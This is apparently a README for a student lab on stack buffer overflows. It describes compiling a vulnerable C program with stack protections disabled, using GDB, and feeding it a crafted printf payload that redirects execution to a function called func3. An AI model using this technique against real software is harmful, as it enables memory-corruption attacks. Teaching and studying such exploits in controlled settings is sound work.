# Buffer Overflow Vulnerability Exploitation Project

## Overview
This project demonstrates a buffer overflow vulnerability exploit using a controlled environment with a vulnerable C program (`prog.c`). It provides insights into buffer overflow mechanics, the exploitation process, and the security implications associated with this vulnerability.

## Table of Contents
1. [Project Structure](#project-structure)
2. [Requirements](#requirements)
3. [Compilation Instructions](#compilation-instructions)
4. [Attack Execution](#attack-execution)
5. [Related Attacks](#related-attacks)
6. [Documentation](#documentation)
7. [License](#license)
8. [Acknowledgments](#acknowledgments)

## Project Structure
- **`src/`**: Contains the vulnerable C program (`prog.c`) used in the exploit demonstration.
- **`docs/`**: Includes a detailed project report (`Buffer_overflow.pdf`) describing the experiment, methodology, and results.

## Requirements
To run this project, ensure you have:
- **gcc** (for compiling C programs)
- **GDB** (GNU Debugger)

## Compilation Instructions
To compile `prog.c` with specific flags that disable security protections and make exploitation feasible, use:

```bash
gcc src/prog.c -o prog -fno-stack-protector -g -no-pie
```

### Explanation of Compilation Flags
- **`-fno-stack-protector`** : Disables stack protection (stack canaries), which usually detect buffer overflows.
- **`-g`** : Includes debugging information for GDB.
- **`-no-pie`** : Disables Position Independent Executable, keeping function addresses static for easier debugging and exploitation.



## Attack Execution
Follow these steps to perform the buffer overflow attack:

1. Launch GDB:
```bash
gdb ./prog
```

2. Set Breakpoints: Use  **`br 21`** to set a breakpoint on line 21 where the overflow occurs.

3. Craft the Payload: Input characters that overflow the buffer, followed by the address of the target function **`func3()`**.

4. Run the Exploit: Execute the payload:

```bash
printf '23 BBBBBBBBBBBBBBBBBB\x97\x11\x40' > input.txt
gdb -q -ex "r < ./input.txt" prog
```

5. Observe Output: Check that the program redirects execution to **`func3()`** and prints the output **`"Inside func3"`**.

### For more details, refer to the full project report in the **`docs/`** directory.

## Related Attacks
This project also examines similar vulnerabilities that can be exploited using buffer overflows:

+ Stack Smashing: Overflowing stack buffers to overwrite the return address.
+ Heap Overflow: Overflowing buffers in the heap to corrupt memory.
+ Format String Attack: Exploiting format strings to access or manipulate memory.
+ Return-to-libc Attack: Redirecting program execution to functions in the libc library.
+ Denial-of-Service (DoS): Crashing or hanging the system by overflowing buffers.
## Documentation
For a comprehensive explanation of the project methodology, attack steps, and observations, see the Buffer Overflow Project Report in the docs/ folder.

## License
This project is licensed under the MIT License - see the **`LICENSE/`** file for details.